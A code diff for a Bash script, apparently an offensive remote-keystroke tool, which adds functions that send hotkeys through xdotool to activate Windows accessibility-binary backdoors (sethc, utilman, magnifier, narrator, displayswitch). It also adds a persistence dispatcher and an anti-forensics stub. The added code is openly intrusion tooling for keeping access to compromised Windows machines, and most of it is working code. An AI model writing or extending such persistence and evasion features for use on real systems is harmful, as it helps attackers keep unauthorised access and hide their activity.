@@ -9,6 +9,11 @@ function check_dependencies() {
     fi
 }
 
+function print_status {
+    # TODO: Add colors
+    echo ""
+}
+
 function CmdFile {
     local file=$1
 
@@ -82,7 +87,7 @@ function Base64 {
         echo "Linux OS"
     fi
 
-    echo "[*] File transferred!"
+    echo "[+] File transferred!"
 }
 
 function CopyCon {
@@ -117,7 +122,7 @@ function CopyCon {
     done < $file_content
 
     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
-    echo "[*] File transferred!"
+    echo "[+] File transferred!"
 }
 
 function OutputRemoteFile {
@@ -141,9 +146,77 @@ function OutputRemoteFile {
     esac
 }
 
+function StickyKey {
+    # TODO: Add a cleanup method
+    echo "[*] Activating sethc.exe (sticky keys) backdoor..."
+    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key shift shift shift shift shift
+    echo "[+] Backdoor Activated!"
+}
+
+function UtilityManager {
+    # TODO: Add a cleanup method
+    echo "[*] Activating utilman.exe (utility manager) backdoor..."
+    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+u
+    echo "[+] Backdoor Activated!"
+}
+
+function Magnifier {
+    # TODO: Add a cleanup method
+    echo "[*] Activating magnifier.exe backdoor..."
+    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+equal
+    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+minus
+    echo "[+] Backdoor Activated!"
+}
+
+function Narrator {
+    # TODO: Add a cleanup method
+    echo "[*] Activating narrator.exe backdoor..."
+    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+Return
+    echo "[+] Backdoor Activated!"
+}
+
+function DisplaySwitch {
+    # TODO: Add a cleanup method
+    echo "[*] Activating displayswitch.exe backdoor..."
+    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+p
+    echo "[+] Backdoor Activated!"
+}
+
+function Persistence {
+    local persistence_method=$1
+    # TODO: Fill in the rest of the persistence methods
+    # Add a -b, --backdoor flag
+    case $persistence_method in
+        sethc)
+            StickyKey
+            ;;
+        utilman)
+            UtilityManager
+            ;;
+        magnifier)
+            Magnifier
+            ;;
+        narrator)
+            Narrator
+            ;;
+        displayswitch)
+            DisplaySwitch
+            ;;
+        *)
+            echo "Invalid Persistence Technique!" >&2
+            exit 1
+            ;;
+    esac
+}
+
+function AntiForensics {
+    # TODO: Include features for anti-forensics
+    echo "Not implemented"
+}
+
 function usage() {
     cat << EOF
-Usage: $0 [-c <command | cmdfile> | -i <input_file> -o <output_file> -p <platform>] [-m <method>] [-w <windowname>] [-h]
+Usage: $0 (RemoteKeyStrokes)
 Options:
     -c, --command <command | cmdfile>       Specify a command or a file containing to execute
     -i, --input <input_file>                Specify the local input file to transfer
